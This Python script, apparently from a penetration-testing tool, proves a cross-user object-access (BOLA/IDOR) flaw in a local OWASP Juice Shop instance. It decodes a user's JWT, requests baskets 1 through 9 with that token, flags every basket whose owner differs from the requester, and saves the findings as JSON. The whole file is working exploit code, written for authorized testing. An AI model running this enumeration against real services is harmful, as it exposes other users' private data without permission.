#!/usr/bin/env python3
"""SENTINEL v4.1 — Juice Shop cross-user BOLA proof (authorized local target).

sentinel41e (regular user) reads OTHER users' baskets via /rest/basket/{id}.
Evidence of ownership mismatch is captured from the response body itself
(basket owner id vs requester id). Recorded as a structured proof artifact —
mirrors the v4.0.0 manual proof methodology on the same authorized target.
"""
import base64
import json
import urllib.request

BASE = "http://localhost:3000"
TOKENS = "/home/z/my-project/live-targets/juice_tokens_v41.json"
OUT = "/home/z/my-project/build-v410/results/live_v41/juiceshop_bola_proof.json"


def req(method, path, token=None):
    r = urllib.request.Request(BASE + path, method=method)
    if token:
        r.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, json.loads(resp.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode() or "{}")
        except Exception:
            return e.code, {}


def jwt_uid(token):
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    data = json.loads(base64.urlsafe_b64decode(payload))
    return data.get("data", {}).get("id"), data.get("data", {}).get("email")


def main():
    toks = json.load(open(TOKENS))
    attacker_tok = toks["sentinel41e@juice-sh.op"]["token"]
    attacker_id, attacker_email = jwt_uid(attacker_tok)
    print(f"[attacker] {attacker_email} (id={attacker_id})")

    evidence = []
    for bid in range(1, 10):
        code, body = req("GET", f"/rest/basket/{bid}", attacker_tok)
        owner = None
        if code == 200 and isinstance(body.get("data"), dict):
            owner = body["data"].get("UserId")
        rec = {"request": f"GET /rest/basket/{bid} as {attacker_email} (id={attacker_id})",
               "status": code, "basket_owner_user_id": owner,
               "bola": bool(code == 200 and owner is not None and owner != attacker_id)}
        if rec["bola"]:
            products = len(body["data"].get("Products", []))
            rec["evidence"] = (f"200 OK: basket {bid} belongs to UserId={owner} "
                               f"while requester id={attacker_id} ({products} product lines)")
            print(f"[BOLA] basket {bid}: 200 OK owner UserId={owner} != attacker {attacker_id}")
        else:
            print(f"[----] basket {bid}: HTTP {code} owner={owner}")
        evidence.append(rec)

    hits = [e for e in evidence if e["bola"]]
    verdict = {
        "target": BASE,
        "class": "IDOR/BOLA (cross-user object access)",
        "method": "manual authorized proof (authz engine is form-login based; "
                  "Juice Shop uses JSON REST login -> engine boundary documented)",
        "attacker": {"email": attacker_email, "id": attacker_id},
        "requests": evidence,
        "confirmed": bool(hits),
        "confirmed_count": len(hits),
        "note": "response bodies themselves carry the foreign UserId — "
                "reproducible ownership-mismatch evidence, no inference",
    }
    with open(OUT, "w") as f:
        json.dump(verdict, f, indent=1)
    print(f"[verdict] confirmed={verdict['confirmed']} ({len(hits)}/9 baskets readable cross-user)")
    print(f"[saved] {OUT}")


if __name__ == "__main__":
    main()
